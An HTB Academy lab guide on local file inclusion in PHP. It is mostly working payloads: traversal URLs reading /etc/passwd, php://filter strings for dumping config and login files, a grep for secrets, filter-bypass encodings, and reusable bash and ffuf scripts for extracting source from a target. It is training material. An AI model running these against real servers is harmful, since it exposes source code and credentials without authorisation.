# 🛰️ HTB Academy PHP Filter Lab Guide

## Introduction

**Target Configuration:**
- **Lab URL:** Various HTB Academy instances
- **Objective:** Read PHP source code using filters

### Step-by-Step Solution:

```bash
# [!CHECK] Step 1: Identify vulnerable parameter
http://target.com/index.php?language=en

# [!SUCCESS] Step 2: Test basic LFI
http://target.com/index.php?language=../../../../etc/passwd

# [!SUCCESS] Step 3: Use PHP filter to read source code
http://target.com/index.php?language=php://filter/convert.base64-encode/resource=index

# [!CHECK] Step 4: Decode base64 output
echo 'BASE64_OUTPUT_HERE' | base64 -d

# [!SUCCESS] Step 5: Analyze source code for credentials/secrets
grep -i "password\|secret\|key\|token" decoded_source.php
```

### Common Files to Target:

```bash
# Configuration files
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=database.php
php://filter/convert.base64-encode/resource=wp-config.php

# Application files
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=admin.php
php://filter/convert.base64-encode/resource=login.php

# Include files
php://filter/convert.base64-encode/resource=functions.php
php://filter/convert.base64-encode/resource=includes/config.inc.php
```

---

## Advanced PHP Filter Techniques

### Filter Chaining:

```bash
# [!SUCCESS] Chain multiple filters
php://filter/string.rot13|convert.base64-encode/resource=index.php

# [!SUCCESS] Multiple conversions
php://filter/convert.iconv.utf8.utf16/convert.base64-encode/resource=index.php
```

### Fuzzing for PHP Files:

```bash
# Common PHP file names to test
admin.php
config.php
database.php
db.php
settings.php
functions.php
includes.php
header.php
footer.php
login.php
logout.php
register.php
profile.php
```

### Automated PHP File Discovery:

```bash
# [!CHECK] Using ffuf for PHP file fuzzing
ffuf -w php_files.txt:FUZZ \
     -u "http://target.com/index.php?file=php://filter/convert.base64-encode/resource=FUZZ" \
     -mc 200 \
     -fs 0

# [!SUCCESS] Using curl with wordlist
for file in $(cat php_files.txt); do
    echo "Testing: $file"
    curl -s "http://target.com/lfi.php?file=php://filter/convert.base64-encode/resource=$file" | head -3
done
```

---

## Filter Bypass Troubleshooting

### Problem: PHP filters not working

```bash
# [!WARNING] Issue: Application doesn't support PHP filters
http://target.com/lfi.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

# [!CHECK] Check 1: Verify PHP filter support
http://target.com/lfi.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

# [!SUCCESS] Check 2: Try different filter types
php://filter/string.rot13/resource=index.php
php://filter/string.toupper/resource=index.php

# [!SUCCESS] Check 3: Try without encoding
php://filter/resource=index.php
```

### Problem: Base64 output truncated

```bash
# [!WARNING] Issue: Long base64 output gets cut off
# [!CHECK] Check 1: Use different output capture methods
curl -s "URL" | tee full_output.txt

# [!SUCCESS] Check 2: Try smaller files first
php://filter/convert.base64-encode/resource=.htaccess

# [!INFO] Check 3: Check for content length limits
curl -s -I "URL" | grep -i content-length
```

### Problem: Encoding/decoding errors

```bash
# [!WARNING] Issue: Base64 decode fails
# [!SUCCESS] Check 1: Clean base64 output
grep -o '[A-Za-z0-9+/=]*' output.txt | tr -d '\n' | base64 -d

# [!SUCCESS] Check 2: Try different decoders
echo 'BASE64_DATA' | python3 -c "import sys,base64; print(base64.b64decode(sys.stdin.read()).decode())"

# [!INFO] Check 3: Check for HTML entity encoding
sed 's/&gt;/>/g; s/&lt;/</g; s/&amp;/\&/g' output.txt | base64 -d
```

### Problem: Non-recursive bypass not working

```bash
# [!WARNING] Issue: ....// pattern still filtered
# [!SUCCESS] Check 1: Try different patterns
....\/....\/etc/passwd
..././..././etc/passwd
....\\....\\etc/passwd

# [!CHECK] Check 2: Test various encodings
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f
%252e%252e%252e%252e%252f%252f

# [!SUCCESS] Check 3: Try mixing techniques
....//....//....//..%2fetc%2fpasswd
```

---

## Tools and Resources

### PHP Filter Tools

```bash
# Manual base64 encoding/decoding
echo "Hello World" | base64
echo "SGVsbG8gV29ybGQ=" | base64 -d

# Automated PHP source extraction
cat << 'EOF' > extract_php_source.sh
#!/bin/bash
URL=$1
FILE=$2
if [ -z "$URL" ] || [ -z "$FILE" ]; then
    echo "Usage: $0 <base_url> <php_file>"
    exit 1
fi

echo "[+] Extracting source for: $FILE"
curl -s "${URL}?file=php://filter/convert.base64-encode/resource=${FILE}" | \
grep -o '[A-Za-z0-9+/=]*' | tr -d '\n' | base64 -d > "${FILE}.extracted"

echo "[+] Source saved to: ${FILE}.extracted"
EOF
chmod +x extract_php_source.sh
```

### Bypass Testing Scripts

```bash
# Non-recursive bypass tester
cat << 'EOF' > test_nonrecursive.sh
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "[+] Testing non-recursive bypasses..."
patterns=(
    "....//....//....//etc/passwd"
    "....\/....\/....\/etc/passwd"
    "..../..../..../etc/passwd"
    "..%2f..%2f..%2fetc%2fpasswd"
)

for pattern in "${patterns[@]}"; do
    echo -n "Testing: $pattern ... "
    result=$(curl -s "${TARGET}${pattern}" | grep -o "root:" | wc -l)
    if [ "$result" -gt 0 ]; then
        echo "SUCCESS"
    else
        echo "FAILED"
    fi
done
EOF
chmod +x test_nonrecursive.sh
```

### URL Encoding Tools

```bash
# URL encode helper function
url_encode() {
    echo "$1" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"
}

# Double URL encode
double_encode() {
    echo "$1" | python3 -c "import sys, urllib.parse; data=sys.stdin.read().strip(); print(urllib.parse.quote(urllib.parse.quote(data)))"
}

# Usage examples
url_encode "../../../etc/passwd"
double_encode "../../../etc/passwd"
```

---

*This guide covers advanced LFI bypass techniques and PHP filters from HTB Academy's File Inclusion module, essential for overcoming common LFI protections and achieving source code disclosure.*